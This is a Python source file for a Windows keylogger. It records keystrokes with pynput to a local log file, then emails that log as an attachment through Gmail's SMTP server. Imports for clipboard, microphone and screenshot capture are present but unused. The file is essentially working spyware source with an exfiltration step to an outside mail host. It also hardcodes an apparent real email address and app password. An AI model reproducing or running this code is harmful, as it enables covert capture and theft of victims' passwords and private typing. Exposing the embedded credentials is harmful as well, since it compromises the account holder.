# logging keys
from pynput.keyboard import Key, Listener

# Email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# computer info
import socket
import platform

# clipboard
import win32clipboard

# microphone
from scipy.io.wavfile import write
import sounddevice as sd

# screenshot
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# cryptography
from cryptography.fernet import Fernet

# other libraries
import time
import os

import getpass
from requests import get

key_info = "key_log.txt"

email_addr = "divkirnapure7@gmail.com"
password = "uqrlxmkvoncsccru"

toaddr = "divkirnapure7@gmail.com"

# creating keylogger

file_path = "C:\\me\\python"
extend = "\\"

count = 0
keys = []

def on_press(key):
    global keys, count 

    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + key_info, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
                f.close()

            elif k.find("key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    try:
        if key == Key.esc:
            return False
    
    except AttributeError:
        pass
    
with Listener(on_press= on_press, on_release= on_release) as listner:
    listner.join()

# adding email functionality

def send_email(filename, attachment_path, toaddr):
    fromaddr = email_addr

    msg = MIMEMultipart()
    msg["From"] = fromaddr
    msg["To"] = toaddr
    msg["Subject"] = "Log File"

    body = "Please find the attached log file."
    msg.attach(MIMEText(body, "plain"))

    # Attachment
    if not os.path.exists(attachment_path):
        print("Attachment not found!")
        return

    with open(attachment_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f'attachment; filename="{filename}"'
    )

    msg.attach(part)

    # SMTP
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(fromaddr, password)  # APP PASSWORD ONLY
        server.sendmail(fromaddr, toaddr, msg.as_string())
        server.quit()
        print("Email sent successfully")

    except smtplib.SMTPAuthenticationError:
        print("Authentication failed. Check App Password.")
    except Exception as e:
        print("Error sending email:", e)

send_email(
    filename=key_info,
    attachment_path=file_path + extend + key_info,
    toaddr=toaddr
)


